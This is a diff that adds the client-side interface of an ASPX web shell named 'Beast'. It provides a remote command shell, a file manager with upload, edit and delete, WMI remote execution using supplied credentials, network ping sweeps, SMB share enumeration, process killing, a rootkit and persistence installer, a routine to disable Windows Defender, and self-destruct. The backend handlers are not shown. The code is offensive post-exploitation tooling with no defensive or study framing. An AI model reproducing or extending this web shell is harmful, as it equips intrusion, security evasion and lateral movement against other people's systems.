+.file-table .ficon{font-size:18px;width:22px;text-align:center}
+.file-table .fsize{color:#8b949e;font-family:'Cascadia Code',Consolas,monospace}
+.file-table .fdate{color:#8b949e;font-size:12px}
+/* TERMINAL */
+.terminal{background:#0d1117;padding:16px;font-family:'Cascadia Code',Consolas,monospace;
+font-size:13px;height:100%;display:flex;flex-direction:column}
+.terminal .output{flex:1;overflow-y:auto;white-space:pre-wrap;color:#7ee787;
+margin-bottom:12px;line-height:1.5}
+.terminal .input-line{display:flex;align-items:center;gap:8px}
+.terminal .prompt{color:#58a6ff;white-space:nowrap}
+.terminal input[type="text"]{flex:1;background:transparent;border:none;
+color:#c9d1d9;font-family:inherit;font-size:13px;outline:none}
+/* CARDS */
+.card{background:#161b22;border:1px solid #30363d;border-radius:8px;
+padding:16px;margin:16px}
+.card h3{font-size:14px;font-weight:400;margin-bottom:12px;color:#e6edf3}
+.card-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(300px,1fr));
+gap:16px;padding:16px}
+/* FORMS */
+.form-group{margin-bottom:12px}
+.form-group label{display:block;font-size:11px;color:#8b949e;margin-bottom:4px;
+text-transform:uppercase}
+.form-group input,.form-group textarea{width:100%;padding:8px 10px;
+background:#0d1117;border:1px solid #30363d;border-radius:6px;
+color:#c9d1d9;font-size:13px;outline:none;resize:vertical}
+.form-group textarea{min-height:100px;font-family:'Cascadia Code',Consolas,monospace}
+.form-group input:focus,.form-group textarea:focus{border-color:#58a6ff}
+.form-row{display:flex;gap:8px}
+/* MODAL */
+.modal-overlay{display:none;position:fixed;top:0;left:0;right:0;bottom:0;
+background:rgba(0,0,0,0.6);z-index:100;align-items:center;justify-content:center}
+.modal-overlay.show{display:flex}
+.modal{background:#161b22;border:1px solid #30363d;border-radius:12px;
+padding:24px;width:500px;max-width:90vw;max-height:80vh;overflow-y:auto;
+box-shadow:0 12px 40px rgba(0,0,0,0.6)}
+.modal h3{font-size:16px;font-weight:400;margin-bottom:16px;color:#e6edf3}
+.modal .btn-row{display:flex;gap:8px;justify-content:flex-end;margin-top:16px}
+.toast{position:fixed;bottom:20px;right:20px;background:#238636;color:#fff;
+padding:10px 20px;border-radius:8px;font-size:13px;z-index:200;
+display:none;box-shadow:0 4px 12px rgba(0,0,0,0.4)}
+.toast.error{background:#da3633}
+</style>
+</head>
+<body>
+
+<!-- SIDEBAR -->
+<nav class="sidebar">
+<div class="sidebar-header">
+<h2><span>&#9760;</span> Beast</h2>
+<div class="host"><%= Environment.MachineName %> — <%= Environment.UserName %></div>
+</div>
+<div class="sidebar-nav">
+<a href="#" data-panel="files" class="active">
+<span class="icon">&#128193;</span> File Manager</a>
+<a href="#" data-panel="shell">
+<span class="icon">&#9000;</span> Shell</a>
+<a href="#" data-panel="lateral">
+<span class="icon">&#127760;</span> Lateral Movement</a>
+<a href="#" data-panel="system">
+<span class="icon">&#9881;</span> System Info</a>
+<a href="#" data-panel="tools">
+<span class="icon">&#128295;</span> Tools</a>
+</div>
+<div class="sidebar-footer">
+<a href="?logout=1">&#10005; Logout</a>
+</div>
+</nav>
+
+<!-- MAIN -->
+<div class="main">
+
+<!-- TOOLBAR -->
+<div class="toolbar" id="toolbar">
+<!-- Populated dynamically per panel -->
+</div>
+
+<!-- BREADCRUMB -->
+<div class="breadcrumb" id="breadcrumb"></div>
+
+<!-- CONTENT -->
+<div class="content">
+
+<!-- FILE MANAGER PANEL -->
+<div class="panel active" id="panel-files">
+<table class="file-table" id="fileTable">
+<thead>
+<tr>
+<th style="width:40%">Name</th>
+<th style="width:15%">Size</th>
+<th style="width:35%">Modified</th>
+<th style="width:10%"></th>
+</tr>
+</thead>
+<tbody id="fileList"></tbody>
+</table>
+</div>
+
+<!-- SHELL PANEL -->
+<div class="panel" id="panel-shell">
+<div class="terminal">
+<div class="output" id="shellOutput">
+Beast Shell — Type commands below. Use 'cls' to clear.
+</div>
+<div class="input-line">
+<span class="prompt"><%= Environment.UserName %>@<%= Environment.MachineName %> &gt;</span>
+<input type="text" id="shellInput" placeholder="whoami /all" autocomplete="off">
+</div>
+</div>
+</div>
+
+<!-- LATERAL PANEL -->
+<div class="panel" id="panel-lateral">
+<div class="card-grid">
+<div class="card">
+<h3>WMI Remote Execution</h3>
+<div class="form-group">
+<label>Target IP/Hostname</label>
+<input type="text" id="l_target" placeholder="192.168.1.50">
+</div>
+<div class="form-row">
+<div class="form-group" style="flex:1">
+<label>Username (optional)</label>
+<input type="text" id="l_user" placeholder="DOMAIN\user">
+</div>
+<div class="form-group" style="flex:1">
+<label>Password</label>
+<input type="password" id="l_pass">
+</div>
+</div>
+<div class="form-group">
+<label>Command</label>
+<input type="text" id="l_cmd" value="whoami">
+</div>
+<button onclick="lateralWmi()">Execute via WMI</button>
+</div>
+<div class="card">
+<h3>Network Scan</h3>
+<div class="form-group">
+<label>Subnet</label>
+<input type="text" id="scan_subnet" placeholder="auto-detect">
+</div>
+<button onclick="networkScan()">Ping Sweep</button>
+<div style="margin-top:12px;max-height:300px;overflow-y:auto;
+font-family:'Cascadia Code',Consolas,monospace;font-size:11px;color:#7ee787"
+id="scanResults"></div>
+</div>
+<div class="card">
+<h3>SMB Share Enumeration</h3>
+<div class="form-group">
+<label>Target</label>
+<input type="text" id="smb_target" placeholder="192.168.1.50">
+</div>
+<button onclick="smbEnum()">Enumerate Shares</button>
+<div style="margin-top:12px;font-family:'Cascadia Code',Consolas,monospace;
+font-size:11px;color:#7ee787" id="smbResults"></div>
+</div>
+</div>
+</div>
+
+<!-- SYSTEM PANEL -->
+<div class="panel" id="panel-system">
+<div class="card-grid">
+<div class="card">
+<h3>System Overview</h3>
+<div id="sysInfoContent" style="font-family:'Cascadia Code',Consolas,monospace;
+font-size:12px;line-height:1.6;color:#7ee787">
+Loading...
+</div>
+</div>
+<div class="card">
+<h3>Process List</h3>
+<div style="max-height:400px;overflow-y:auto" id="procList">
+<button onclick="loadProcesses()" style="margin-bottom:8px">Refresh</button>
+</div>
+</div>
+</div>
+</div>
+
+<!-- TOOLS PANEL -->
+<div class="panel" id="panel-tools">
+<div class="card-grid">
+<div class="card">
+<h3>Persistence / Rootkit</h3>
+<p style="font-size:12px;color:#8b949e;margin-bottom:12px">
+Install file protection, hidden attributes, and registry persistence.</p>
+<button onclick="installRootkit()">&#128737; Install Rootkit</button>
+<div id="rootkitResult" style="margin-top:8px;font-size:12px"></div>
+</div>
+<div class="card">
+<h3>Neutralize Security</h3>
+<p style="font-size:12px;color:#8b949e;margin-bottom:12px">
+Kill Defender processes, disable via registry, stop services.</p>
+<button class="danger" onclick="neutralizeSecurity()">&#9888; Neutralize</button>
+<div id="neutralizeResult" style="margin-top:8px;font-size:12px"></div>
+</div>
+<div class="card">
+<h3>Self-Destruct</h3>
+<p style="font-size:12px;color:#f85149;margin-bottom:12px">
+Delete this shell file permanently. Irreversible.</p>
+<button class="danger" onclick="selfDestruct()">&#128163; Self-Destruct</button>
+<div id="destructResult" style="margin-top:8px;font-size:12px"></div>
+</div>
+</div>
+</div>
+
+</div><!-- /content -->
+</div><!-- /main -->
+
+<!-- MODALS -->
+<div class="modal-overlay" id="uploadModal">
+<div class="modal">
+<h3>Upload File</h3>
+<div class="form-group">
+<label>Destination Directory</label>
+<input type="text" id="uploadDir" readonly>
+</div>
+<input type="file" id="uploadFileInput" style="margin-bottom:12px;color:#c9d1d9">
+<div class="btn-row">
+<button onclick="closeUploadModal()">Cancel</button>
+<button onclick="uploadFile()" style="background:#238636">Upload</button>
+</div>
+</div>
+</div>
+
+<div class="modal-overlay" id="editModal">
+<div class="modal" style="width:700px">
+<h3 id="editTitle">Edit File</h3>
+<div class="form-group">
+<label>File Path</label>
+<input type="text" id="editPath" readonly>
+</div>
+<textarea id="editContent" style="min-height:300px;
+font-family:'Cascadia Code',Consolas,monospace;font-size:12px"></textarea>
+<div class="btn-row">
+<button onclick="closeEditModal()">Cancel</button>
+<button onclick="saveEdit()" style="background:#238636">Save</button>
+</div>
+</div>
+</div>
+
+<div class="modal-overlay" id="promptModal">
+<div class="modal">
+<h3 id="promptTitle">Prompt</h3>
+<div class="form-group">
+<label id="promptLabel"></label>
+<input type="text" id="promptInput">
+</div>
+<div class="btn-row">
+<button onclick="closePromptModal()">Cancel</button>
+<button onclick="submitPrompt()" style="background:#238636">OK</button>
+</div>
+</div>
+</div>
+
+<div class="toast" id="toast"></div>
+
+<script>
+// ─── STATE ────────────────────────────────────────
+var currentDir = '';
+var selectedFiles = [];
+var promptCallback = null;
+
+// ─── INIT ─────────────────────────────────────────
+document.addEventListener('DOMContentLoaded', function() {
+    // Sidebar navigation
+    document.querySelectorAll('.sidebar-nav a').forEach(function(a) {
+        a.addEventListener('click', function(e) {
+            e.preventDefault();
+            var panel = this.getAttribute('data-panel');
+            switchPanel(panel);
+        });
+    });
+
+    // Shell input
+    document.getElementById('shellInput').addEventListener('keydown', function(e) {
+        if (e.key === 'Enter') {
+            executeCmd(this.value);
+            this.value = '';
+        }
+    });
+
+    // Init file manager
+    navigateTo('');
+
+    // Load system info
+    loadSystemInfo();
+});
+
+// ─── PANEL SWITCHING ──────────────────────────────
+function switchPanel(panel) {
+    document.querySelectorAll('.panel').forEach(function(p) {
+        p.classList.remove('active');
+    });
+    document.querySelectorAll('.sidebar-nav a').forEach(function(a) {
+        a.classList.remove('active');
+    });
+
+    var panelEl = document.getElementById('panel-' + panel);
+    if (panelEl) panelEl.classList.add('active');
+
+    var navEl = document.querySelector('[data-panel="' + panel + '"]');
+    if (navEl) navEl.classList.add('active');
+
+    // Update toolbar
+    var toolbar = document.getElementById('toolbar');
+    var breadcrumb = document.getElementById('breadcrumb');
+
+    if (panel === 'files') {
+        toolbar.innerHTML =
+            '<button onclick="refreshFiles()">&#8635; Refresh</button>' +
+            '<span class="sep"></span>' +
+            '<button onclick="showUploadModal()">&#8682; Upload</button>' +
+            '<button onclick="showNewFolderPrompt()">&#128193; New Folder</button>' +
+            '<button onclick="showNewFilePrompt()">&#128196; New File</button>' +
+            '<span class="sep"></span>' +
+            '<button class="danger" onclick="deleteSelected()">&#10005; Delete Selected</button>';
+        breadcrumb.style.display = 'flex';
+        refreshBreadcrumb();
+    } else {
+        toolbar.innerHTML = '';
+        breadcrumb.style.display = 'none';
+    }
+
+    if (panel === 'shell') {
+        document.getElementById('shellInput').focus();
+    }
+}
+
+// ─── FILE MANAGER ─────────────────────────────────
+function navigateTo(dir) {
+    currentDir = dir;
+    refreshFiles();
+}
+
+function refreshFiles() {
+    var xhr = new XMLHttpRequest();
+    xhr.open('POST', window.location.href, true);
+    xhr.setRequestHeader('Content-Type',
+        'application/x-www-form-urlencoded');
+    xhr.onload = function() {
+        if (xhr.status === 200) {
+            try {
+                var data = JSON.parse(xhr.responseText);
+                if (data.error) {
+                    showToast(data.error, true);
+                    return;
+                }
+                currentDir = data.path;
+                renderFileList(data);
+                refreshBreadcrumb();
+            } catch(e) {
+                showToast('Parse error', true);
+            }
+        }
+    };
+    xhr.send('action=list&dir=' + encodeURIComponent(currentDir));
+}
+
+function renderFileList(data) {
+    var tbody = document.getElementById('fileList');
+    tbody.innerHTML = '';
+
+    // Parent directory link
+    if (data.parent !== data.path) {
+        var tr = document.createElement('tr');
+        tr.innerHTML =
+            '<td colspan="4">' +
+            '<div class="fname">' +
+            '<span class="ficon">&#128193;</span>' +
+            '<a href="#" onclick="navigateTo(\'' +
+            escapeHtml(data.parent) + '\')">.. (parent)</a>' +
+            '</div></td>';
+        tbody.appendChild(tr);
+    }
+
+    data.items.forEach(function(item) {
+        var tr = document.createElement('tr');
+        tr.setAttribute('data-path', data.path + '\\' + item.name);
+        tr.setAttribute('data-type', item.type);
+
+        var icon = item.type === 'dir' ? '&#128193;' : '&#128196;';
+        var nameHtml = item.type === 'dir' ?
+            '<a href="#" onclick="navigateTo(\'' +
+            escapeHtml(data.path + '\\' + item.name) + '\')">' +
+            escapeHtml(item.name) + '</a>' :
+            '<span onclick="promptRename(\'' +
+            escapeHtml(data.path) + '\',\'' +
+            escapeHtml(item.name) + '\')" title="Click to rename">' +
+            escapeHtml(item.name) + '</span>';
+
+        tr.innerHTML =
+            '<td><div class="fname">' +
+            '<span class="ficon">' + icon + '</span>' +
+            nameHtml +
+            '</div></td>' +
+            '<td class="fsize">' + escapeHtml(item.size) + '</td>' +
+            '<td class="fdate">' + escapeHtml(item.modified) + '</td>' +
+            '<td>' +
+            (item.type === 'file' ?
+                '<button class="btn-sm" onclick="event.stopPropagation();' +
+                'downloadFile(\'' +
+                escapeHtml(data.path + '\\' + item.name) +
+                '\')">&#128229;</button> ' : '') +
+            (item.type === 'file' && isTextFile(item.name) ?
+                '<button class="btn-sm" onclick="event.stopPropagation();' +
+                'editFile(\'' +
+                escapeHtml(data.path + '\\' + item.name) +
+                '\')">&#9998;</button>' : '') +
+            '</td>';
+
+        tr.addEventListener('click', function(e) {
+            if (e.target.tagName === 'A' || e.target.tagName === 'BUTTON')
+                return;
+            if (e.ctrlKey) {
+                this.classList.toggle('selected');
+                updateSelected();
+            } else {
+                document.querySelectorAll('.file-table tr.selected')
+                    .forEach(function(r) { r.classList.remove('selected'); });
+                this.classList.add('selected');
+                updateSelected();
+            }
+        });
+
+        tbody.appendChild(tr);
+    });
+}
+
+function updateSelected() {
+    selectedFiles = [];
+    document.querySelectorAll('.file-table tr.selected').forEach(function(r) {
+        selectedFiles.push({
+            path: r.getAttribute('data-path'),
+            type: r.getAttribute('data-type')
+        });
+    });
+}
+
+function refreshBreadcrumb() {
+    var bc = document.getElementById('breadcrumb');
+    var parts = currentDir.split('\\');
+    var html = '';
+    var accum = '';
+    for (var i = 0; i < parts.length; i++) {
+        if (i === 0) {
+            accum = parts[0];
+        } else {
+            accum += '\\' + parts[i];
+        }
+        if (i > 0) html += ' <span>&gt;</span> ';
+        html += '<a href="#" onclick="navigateTo(\'' +
+            escapeHtml(accum) + '\')">' +
+            escapeHtml(parts[i] || (i === 0 ? '\\' : '')) + '</a>';
+    }
+    bc.innerHTML = html;
+}
+
+function deleteSelected() {
+    if (selectedFiles.length === 0) {
+        showToast('No files selected', true);
+        return;
+    }
+    if (!confirm('Delete ' + selectedFiles.length + ' item(s)? This cannot be undone.'))
+        return;
+
+    var remaining = selectedFiles.length;
+    selectedFiles.forEach(function(item) {
+        var action = item.type === 'dir' ? 'delete_dir' : 'delete';
+        var xhr = new XMLHttpRequest();
+        xhr.open('POST', window.location.href, true);
+        xhr.setRequestHeader('Content-Type',
+            'application/x-www-form-urlencoded');
+        xhr.onload = function() {
+            remaining--;
+            if (remaining === 0) {
+                refreshFiles();
+                showToast('Deleted successfully');
+            }
+        };
+        xhr.send('action=' + action + '&path=' +
+            encodeURIComponent(item.path));
+    });
+}
+
+// ─── FILE OPERATIONS ──────────────────────────────
+function downloadFile(path) {
+    var form = document.createElement('form');
+    form.method = 'POST';
+    form.action = window.location.href;
+    var input = document.createElement('input');
+    input.type = 'hidden';
+    input.name = 'action';
+    input.value = 'download';
+    var input2 = document.createElement('input');
+    input2.type = 'hidden';
+    input2.name = 'path';
+    input2.value = path;
+    form.appendChild(input);
+    form.appendChild(input2);
+    document.body.appendChild(form);
+    form.submit();
+    document.body.removeChild(form);
+}
+
+function showUploadModal() {
+    document.getElementById('uploadDir').value = currentDir;
+    document.getElementById('uploadModal').classList.add('show');
+}
+
+function closeUploadModal() {
+    document.getElementById('uploadModal').classList.remove('show');
+    document.getElementById('uploadFileInput').value = '';
+}
+
+function uploadFile() {
+    var fileInput = document.getElementById('uploadFileInput');
+    if (!fileInput.files || fileInput.files.length === 0) {
+        showToast('Select a file', true);
+        return;
+    }
+    var formData = new FormData();
+    formData.append('action', 'upload');
+    formData.append('dir', currentDir);
+    formData.append('file', fileInput.files[0]);
+
+    var xhr = new XMLHttpRequest();
+    xhr.open('POST', window.location.href, true);
+    xhr.onload = function() {
+        closeUploadModal();
+        refreshFiles();
+        try {
+            var resp = JSON.parse(xhr.responseText);
+            showToast(resp.ok ? 'Uploaded' : (resp.error || 'Failed'),
+                !resp.ok);
+        } catch(e) {
+            showToast('Uploaded');
+        }
+    };
+    xhr.send(formData);
+}
+
+function showNewFolderPrompt() {
+    showPrompt('New Folder', 'Folder name:', function(name) {
+        var xhr = new XMLHttpRequest();
+        xhr.open('POST', window.location.href, true);
+        xhr.setRequestHeader('Content-Type',
+            'application/x-www-form-urlencoded');
+        xhr.onload = function() {
+            refreshFiles();
+            showToast('Folder created');
+        };
+        xhr.send('action=new_folder&dir=' +
+            encodeURIComponent(currentDir) + '&name=' +
+            encodeURIComponent(name));
+    });
+}
+
+function showNewFilePrompt() {
+    showPrompt('New File', 'File name:', function(name) {
+        var xhr = new XMLHttpRequest();
+        xhr.open('POST', window.location.href, true);
+        xhr.setRequestHeader('Content-Type',
+            'application/x-www-form-urlencoded');
+        xhr.onload = function() {
+            refreshFiles();
+            showToast('File created');
+        };
+        xhr.send('action=new_file&dir=' +
+            encodeURIComponent(currentDir) + '&name=' +
+            encodeURIComponent(name));
+    });
+}
+
+function promptRename(dir, oldName) {
+    showPrompt('Rename', 'New name for: ' + oldName, function(newName) {
+        var xhr = new XMLHttpRequest();
+        xhr.open('POST', window.location.href, true);
+        xhr.setRequestHeader('Content-Type',
+            'application/x-www-form-urlencoded');
+        xhr.onload = function() {
+            refreshFiles();
+            showToast('Renamed');
+        };
+        xhr.send('action=rename&path=' +
+            encodeURIComponent(dir + '\\' + oldName) +
+            '&new_name=' + encodeURIComponent(newName));
+    }, oldName);
+}
+
+function editFile(path) {
+    var xhr = new XMLHttpRequest();
+    xhr.open('POST', window.location.href, true);
+    xhr.setRequestHeader('Content-Type',
+        'application/x-www-form-urlencoded');
+    xhr.onload = function() {
+        try {
+            var data = JSON.parse(xhr.responseText);
+            if (data.error) {
+                showToast(data.error, true);
+                return;
+            }
+            document.getElementById('editPath').value = path;
+            document.getElementById('editContent').value = data.content;
+            document.getElementById('editTitle').textContent =
+                'Edit: ' + path.split('\\').pop();
+            document.getElementById('editModal').classList.add('show');
+        } catch(e) {
+            showToast('Failed to load file', true);
+        }
+    };
+    xhr.send('action=read_file&path=' +
+        encodeURIComponent(path));
+}
+
+function closeEditModal() {
+    document.getElementById('editModal').classList.remove('show');
+}
+
+function saveEdit() {
+    var path = document.getElementById('editPath').value;
+    var content = document.getElementById('editContent').value;
+    var xhr = new XMLHttpRequest();
+    xhr.open('POST', window.location.href, true);
+    xhr.setRequestHeader('Content-Type',
+        'application/x-www-form-urlencoded');
+    xhr.onload = function() {
+        closeEditModal();
+        refreshFiles();
+        showToast('Saved');
+    };
+    xhr.send('action=write_file&path=' +
+        encodeURIComponent(path) + '&content=' +
+        encodeURIComponent(content));
+}
+
+// ─── SHELL ────────────────────────────────────────
+function executeCmd(cmd) {
+    if (cmd.trim().toLowerCase() === 'cls') {
+        document.getElementById('shellOutput').textContent = '';
+        return;
+    }
+    var output = document.getElementById('shellOutput');
+    output.textContent += '\n> ' + cmd + '\n';
+
+    var xhr = new XMLHttpRequest();
+    xhr.open('POST', window.location.href, true);
+    xhr.setRequestHeader('Content-Type',
+        'application/x-www-form-urlencoded');
+    xhr.onload = function() {
+        try {
+            var data = JSON.parse(xhr.responseText);
+            output.textContent += (data.output || data.error || '') + '\n';
+            output.scrollTop = output.scrollHeight;
+        } catch(e) {}
+    };
+    xhr.send('action=exec&cmd=' + encodeURIComponent(cmd));
+}
+
+// ─── LATERAL MOVEMENT ─────────────────────────────
+function lateralWmi() {
+    var target = document.getElementById('l_target').value;
+    var user = document.getElementById('l_user').value;
+    var pass = document.getElementById('l_pass').value;
+    var cmd = document.getElementById('l_cmd').value;
+
+    var xhr = new XMLHttpRequest();
+    xhr.open('POST', window.location.href, true);
+    xhr.setRequestHeader('Content-Type',
+        'application/x-www-form-urlencoded');
+    xhr.onload = function() {
+        try {
+            var data = JSON.parse(xhr.responseText);
+            document.getElementById('scanResults').textContent =
+                data.output || data.error || 'No output';
+        } catch(e) {}
+    };
+    xhr.send('action=lateral_wmi&target=' +
+        encodeURIComponent(target) + '&l_user=' +
+        encodeURIComponent(user) + '&l_pass=' +
+        encodeURIComponent(pass) + '&l_cmd=' +
+        encodeURIComponent(cmd));
+}
+
+function networkScan() {
+    var subnet = document.getElementById('scan_subnet').value;
+    document.getElementById('scanResults').textContent =
+        'Scanning... (this may take up to 60 seconds)';
+
+    var xhr = new XMLHttpRequest();
+    xhr.open('POST', window.location.href, true);
+    xhr.setRequestHeader('Content-Type',
+        'application/x-www-form-urlencoded');
+    xhr.onload = function() {
+        try {
+            var data = JSON.parse(xhr.responseText);
+            var hosts = data.hosts || [];
+            var out = 'Subnet: ' + data.subnet + '\n';
+            out += 'Live hosts: ' + hosts.length + '\n';
+            out += '─'.repeat(40) + '\n';
+            hosts.forEach(function(h) {
+                out += h.ip + '  ' + h.hostname + '\n';
+            });
+            document.getElementById('scanResults').textContent = out;
+        } catch(e) {
+            document.getElementById('scanResults').textContent =
+                'Scan failed';
+        }
+    };
+    xhr.send('action=lateral_scan&subnet=' +
+        encodeURIComponent(subnet));
+}
+
+function smbEnum() {
+    var target = document.getElementById('smb_target').value;
+    var xhr = new XMLHttpRequest();
+    xhr.open('POST', window.location.href, true);
+    xhr.setRequestHeader('Content-Type',
+        'application/x-www-form-urlencoded');
+    xhr.onload = function() {
+        try {
+            var data = JSON.parse(xhr.responseText);
+            var shares = data.shares || [];
+            var out = 'Shares on ' + target + ':\n';
+            out += '─'.repeat(40) + '\n';
+            shares.forEach(function(s) {
+                out += s.name + ' → ' + s.path + '\n';
+            });
+            document.getElementById('smbResults').textContent = out;
+        } catch(e) {}
+    };
+    xhr.send('action=smb_enum&target=' +
+        encodeURIComponent(target));
+}
+
+// ─── SYSTEM ───────────────────────────────────────
+function loadSystemInfo() {
+    var xhr = new XMLHttpRequest();
+    xhr.open('POST', window.location.href, true);
+    xhr.setRequestHeader('Content-Type',
+        'application/x-www-form-urlencoded');
+    xhr.onload = function() {
+        try {
+            var data = JSON.parse(xhr.responseText);
+            document.getElementById('sysInfoContent').innerHTML =
+                '<b>Hostname:</b> ' + escapeHtml(data.hostname) + '<br>' +
+                '<b>User:</b> ' + escapeHtml(data.user) + '<br>' +
+                '<b>OS:</b> ' + escapeHtml(data.os) + '<br>' +
+                '<b>.NET:</b> ' + escapeHtml(data.iis_version) + '<br><br>' +
+                '<b>Drives:</b><br>' +
+                escapeHtml(data.drives).replace(/\\n/g, '<br>');
+        } catch(e) {}
+    };
+    xhr.send('action=sysinfo');
+}
+
+function loadProcesses() {
+    var xhr = new XMLHttpRequest();
+    xhr.open('POST', window.location.href, true);
+    xhr.setRequestHeader('Content-Type',
+        'application/x-www-form-urlencoded');
+    xhr.onload = function() {
+        try {
+            var data = JSON.parse(xhr.responseText);
+            var procs = data.processes || [];
+            var html = '<table style="width:100%;font-size:11px;border-collapse:collapse">';
+            html += '<tr style="color:#8b949e"><th style="text-align:left">PID</th>' +
+                '<th style="text-align:left">Name</th><th style="text-align:right">Memory</th>' +
+                '<th></th></tr>';
+            procs.sort(function(a,b) { return b.memory - a.memory; }).slice(0,50)
+                .forEach(function(p) {
+                html += '<tr style="border-bottom:1px solid #21262d">' +
+                    '<td>' + p.id + '</td>' +
+                    '<td>' + escapeHtml(p.name) + '</td>' +
+                    '<td style="text-align:right">' +
+                    formatBytes(p.memory) + '</td>' +
+                    '<td><button class="btn-sm" onclick="killProcess(' +
+                    p.id + ')" style="font-size:10px;padding:2px 6px">Kill</button></td>' +
+                    '</tr>';
+            });
+            html += '</table>';
+            document.getElementById('procList').innerHTML =
+                '<button onclick="loadProcesses()" style="margin-bottom:8px">Refresh</button>' +
+                html;
+        } catch(e) {}
+    };
+    xhr.send('action=proc_list');
+}
+
+function killProcess(pid) {
+    var xhr = new XMLHttpRequest();
+    xhr.open('POST', window.location.href, true);
+    xhr.setRequestHeader('Content-Type',
+        'application/x-www-form-urlencoded');
+    xhr.onload = function() {
+        loadProcesses();
+        showToast('Process killed');
+    };
+    xhr.send('action=proc_kill&pid=' + pid);
+}
+
+// ─── TOOLS ────────────────────────────────────────
+function installRootkit() {
+    var xhr = new XMLHttpRequest();
+    xhr.open('POST', window.location.href, true);
+    xhr.setRequestHeader('Content-Type',
+        'application/x-www-form-urlencoded');
+    xhr.onload = function() {
+        try {
+            var data = JSON.parse(xhr.responseText);
+            document.getElementById('rootkitResult').innerHTML =
+                data.ok ?
+                '<span style="color:#7ee787">&#10003; ' +
+                data.message + '</span>' :
+                '<span style="color:#f85149">' +
+                (data.error || 'Failed') + '</span>';
+        } catch(e) {}
+    };
+    xhr.send('action=rootkit');
+}
+
+function neutralizeSecurity() {
+    if (!confirm('Attempt to disable security products? This is noisy.'))
+        return;
+    var xhr = new XMLHttpRequest();
+    xhr.open('POST', window.location.href, true);
+    xhr.setRequestHeader('Content-Type',
+        'application/x-www-form-urlencoded');
+    xhr.onload = function() {
+        try {
+            var data = JSON.parse(xhr.responseText);
+            document.getElementById('neutralizeResult').innerHTML =
+                '<pre style="font-size:11px;color:#7ee787;white-space:pre-wrap">' +
+                escapeHtml(data.output || data.error || '') + '</pre>';
+        } catch(e) {}
+    };
+    xhr.send('action=neutralize');
+}
+
+function selfDestruct() {
+    if (!confirm('PERMANENTLY DELETE THIS SHELL? This cannot be undone.'))
+        return;
+    if (!confirm('Final confirmation. Really delete?'))
+        return;
+    var xhr = new XMLHttpRequest();
+    xhr.open('POST', window.location.href, true);
+    xhr.setRequestHeader('Content-Type',
+        'application/x-www-form-urlencoded');
+    xhr.onload = function() {
+        try {
+            var data = JSON.parse(xhr.responseText);
+            document.getElementById('destructResult').innerHTML =
+                '<span style="color:#f85149">' +
+                escapeHtml(data.message || data.error || 'Done') +
+                '</span>';
+            showToast('Self-destruct initiated', false);
+        } catch(e) {}
+    };
+    xhr.send('action=selfdestruct');
+}
+
+// ─── PROMPT MODAL ─────────────────────────────────
+function showPrompt(title, label, callback, defaultValue) {
+    document.getElementById('promptTitle').textContent = title;
+    document.getElementById('promptLabel').textContent = label;
+    document.getElementById('promptInput').value = defaultValue || '';
+    document.getElementById('promptModal').classList.add('show');
+    promptCallback = callback;
+    document.getElementById('promptInput').focus();
+    document.getElementById('promptInput').select();
+}
+
+function closePromptModal() {
+    document.getElementById('promptModal').classList.remove('show');
+    promptCallback = null;
+}
+
+function submitPrompt() {
+    var val = document.getElementById('promptInput').value;
+    closePromptModal();
+    if (promptCallback && val) {
+        promptCallback(val);
+    }
+}
+
+// Handle Enter in prompt
+document.addEventListener('DOMContentLoaded', function() {
+    document.getElementById('promptInput').addEventListener('keydown',
+        function(e) {
+            if (e.key === 'Enter') submitPrompt();
+        });
+});
+
+// ─── TOAST ────────────────────────────────────────
+function showToast(msg, isError) {
+    var toast = document.getElementById('toast');
+    toast.textContent = msg;
+    toast.className = 'toast' + (isError ? ' error' : '');
+    toast.style.display = 'block';
+    setTimeout(function() {
+        toast.style.display = 'none';
+    }, 2500);
+}
+
+// ─── UTILS ────────────────────────────────────────
+function escapeHtml(s) {
+    if (!s) return '';
+    return s.replace(/&/g, '&amp;')
+            .replace(/</g, '&lt;')
+            .replace(/>/g, '&gt;')
+            .replace(/"/g, '&quot;')
+            .replace(/'/g, '&#039;');
+}
+
+function isTextFile(name) {
+    var ext = name.split('.').pop().toLowerCase();
+    var textExts = ['txt','log','xml','config','ini','cfg','conf',
+        'bat','cmd','ps1','vbs','js','css','html','htm',
+        'asp','aspx','php','jsp','py','rb','pl','sh',
+        'csv','json','yaml','yml','md','sql','inf','reg'];
+    return textExts.indexOf(ext) !== -1;
+}
+
+function formatBytes(bytes) {
+    if (bytes === 0) return '0 B';
+    var k = 1024;
+    var sizes = ['B','KB','MB','GB'];
+    var i = Math.floor(Math.log(bytes) / Math.log(k));
+    return parseFloat((bytes / Math.pow(k, i)).toFixed(1)) + ' ' + sizes[i];
+}
+
+// Click-outside to close modals
+document.addEventListener('click', function(e) {
+    if (e.target.classList.contains('modal-overlay')) {
+        e.target.classList.remove('show');
+    }
+});
+</script>
+</body>
+</html>
+<%
+    }
+%>
